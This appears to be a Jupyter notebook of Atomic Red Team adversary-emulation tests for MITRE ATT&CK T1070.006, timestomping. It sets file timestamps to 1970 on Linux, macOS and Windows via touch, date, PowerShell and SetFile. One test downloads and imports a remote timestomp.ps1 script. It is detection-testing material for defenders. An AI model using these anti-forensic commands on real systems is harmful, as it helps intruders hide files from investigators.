{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "aca5775c",
   "metadata": {},
   "source": "# T1070.006 - Timestomp\nAdversaries may modify file time attributes to hide new or changes to existing files. Timestomping is a technique that modifies the timestamps of a file (the modify, access, create, and change times), often to mimic files that are in the same folder. This is done, for example, on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools.\n\nTimestomping may be used along with file name [Masquerading](https://attack.mitre.org/techniques/T1036) to hide malware and tools.(Citation: WindowsIR Anti-Forensic Techniques)"
  },
  {
   "cell_type": "markdown",
   "id": "cf0db910",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "854fa089",
   "metadata": {},
   "source": "### Atomic Test #1 - Set a file's access timestamp\nStomps on the access timestamp of a file\n\n**Supported Platforms:** linux, macos\n#### Dependencies:  Run with `sh`!\n##### Description: The file must exist in order to be timestomped\n\n##### Check Prereq Commands:\n```sh\ntest -e /tmp/T1070.006-access.txt && exit 0 || exit 1\n\n```\n##### Get Prereq Commands:\n```sh\necho 'T1070.006 file access timestomp test' > /tmp/T1070.006-access.txt\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3350d3f7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 1 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "67ddc02f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntouch -a -t 197001010000.00 /tmp/T1070.006-access.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c614818d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "112c4aae",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1070.006-access.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2dcc0cfd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "5160641a",
   "metadata": {},
   "source": "### Atomic Test #2 - Set a file's modification timestamp\nStomps on the modification timestamp of a file\n\n**Supported Platforms:** linux, macos\n#### Dependencies:  Run with `sh`!\n##### Description: The file must exist in order to be timestomped\n\n##### Check Prereq Commands:\n```sh\ntest -e /tmp/T1070.006-modification.txt && exit 0 || exit 1\n\n```\n##### Get Prereq Commands:\n```sh\necho 'T1070.006 file modification timestomp test' > /tmp/T1070.006-modification.txt\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "00de5ddd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 2 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "44e47e6f",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntouch -m -t 197001010000.00 /tmp/T1070.006-modification.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "65da0cf8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "d1c9f969",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1070.006-modification.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5bcbbca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 2 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "dbfffb93",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Set a file's creation timestamp",
    "Stomps on the create timestamp of a file\n\nSetting the creation timestamp requires changing the system clock and reverting.\nSudo or root privileges are required to change date. Use with caution.\n",
    "**Supported Platforms:** linux, macos",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nNOW=$(date +%m%d%H%M%Y)\ndate 010100001971\ntouch /tmp/T1070.006-creation.txt\ndate \"$NOW\"\nstat /tmp/T1070.006-creation.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "27e38cb9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "90ae7000",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1070.006-creation.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "111aca6c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 3 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "d9ecfc7a",
   "metadata": {},
   "source": "### Atomic Test #4 - Modify file timestamps using reference file\nModifies the `modify` and `access` timestamps using the timestamps of a specified reference file.\n\nThis technique was used by the threat actor Rocke during the compromise of Linux web servers.\n\n**Supported Platforms:** linux, macos\n#### Dependencies:  Run with `sh`!\n##### Description: The file must exist in order to be timestomped\n\n##### Check Prereq Commands:\n```sh\ntest -e /tmp/T1070.006-reference.txt && exit 0 || exit 1\n\n```\n##### Get Prereq Commands:\n```sh\necho 'T1070.006 reference file timestomp test' > /tmp/T1070.006-reference.txt\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "59b25599",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ea681a26",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\ntouch -acmr /bin/sh /tmp/T1070.006-reference.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c89e264f",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "c8976bc0",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1070.006-reference.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "685bb20b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "786dbd0a",
   "metadata": {},
   "source": "### Atomic Test #5 - Windows - Modify file creation timestamp with PowerShell\nModifies the file creation timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Created time is the year 1970.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: A file must exist at the path (#{file_path}) to change the creation time on\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Force | Out-Null\nSet-Content \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e8cae5bf",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "69dde144",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.CreationTime = \"01/01/1970 00:00:00\" }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "be483444",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "4efb03c0",
   "metadata": {},
   "source": "### Atomic Test #6 - Windows - Modify file last modified timestamp with PowerShell\nModifies the file last modified timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Modified time is the year 1970.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: A file must exist at the path (#{file_path}) to change the modified time on\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Force | Out-Null\nSet-Content \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6612273d",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "7d05913c",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.LastWriteTime = \"01/01/1970 00:00:00\" }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f3542d76",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "69cafe96",
   "metadata": {},
   "source": "### Atomic Test #7 - Windows - Modify file last access timestamp with PowerShell\nModifies the last access timestamp of a specified file. This technique was seen in use by the Stitch RAT.\nTo verify execution, use File Explorer to view the Properties of the file and observe that the Accessed time is the year 1970.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: A file must exist at the path (\"#{file_path}\") to change the last access time on\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Force | Out-Null\nSet-Content \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" -Value \"T1551.006 Timestomp\" -Force | Out-Null\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "928fd176",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "88097798",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1551.006_timestomp.txt\" | % { $_.LastAccessTime = \"01/01/1970 00:00:00\" }\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f05500b8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "1aa74465",
   "metadata": {},
   "source": "### Atomic Test #8 - Windows - Timestomp a File\nTimestomp kxwn.lock.\n\nSuccessful execution will include the placement of kxwn.lock in #{file_path} and execution of timestomp.ps1 to modify the time of the .lock file. \n\n[Mitre ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/master/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/defensive-evasion/4a2ad84e-a93a-4b2e-b1f0-c354d6a41278.yml)\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: timestomp.ps1 must be present in #{file_path}.\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest \"https://raw.githubusercontent.com/mitre-attack/attack-arsenal/bc0ba1d88d026396939b6816de608cb279bfd489/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/timestomp.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1\"\n\n```\n##### Description: kxwn.lock must be present in #{file_path}.\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path -path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kxwn.lock\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kxwn.lock\" -ItemType File\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4bea40b9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "4c2c1540",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nimport-module \"PathToAtomicsFolder\\..\\ExternalPayloads\\timestomp.ps1\"\ntimestomp -dest \"PathToAtomicsFolder\\..\\ExternalPayloads\\kxwn.lock\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f7a9ddca",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "2fcea636",
   "metadata": {},
   "source": "### Atomic Test #9 - MacOS - Timestomp Date Modified\nStomps on the modification timestamp of a file using MacOS's SetFile utility\n\n**Supported Platforms:** macos\n#### Dependencies:  Run with `sh`!\n##### Description: The file must exist in order to be timestomped\n\n##### Check Prereq Commands:\n```sh\ntest -e /tmp/T1070.006-modified.txt && exit 0 || exit 1\n\n```\n##### Get Prereq Commands:\n```sh\necho 'T1070.006 MacOS file modified timestomp test' > /tmp/T1070.006-modified.txt\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dcbc6bf7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 9 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d7894b81",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nSetFile -m 01/01/1970 /tmp/T1070.006-modified.txt\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "60430454",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "952a4c50",
   "metadata": {},
   "source": "#### Cleanup: \n```sh\nrm -f /tmp/T1070.006-modified.txt\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "167bfe45",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1070.006 -TestNumbers 9 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "ebeb97cc",
   "metadata": {},
   "source": "## Detection\nForensic techniques exist to detect aspects of files that have had their timestamps modified. (Citation: WindowsIR Anti-Forensic Techniques) It may be possible to detect timestomping using file modification monitoring that collects information on file handle opens and can compare timestamp values."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}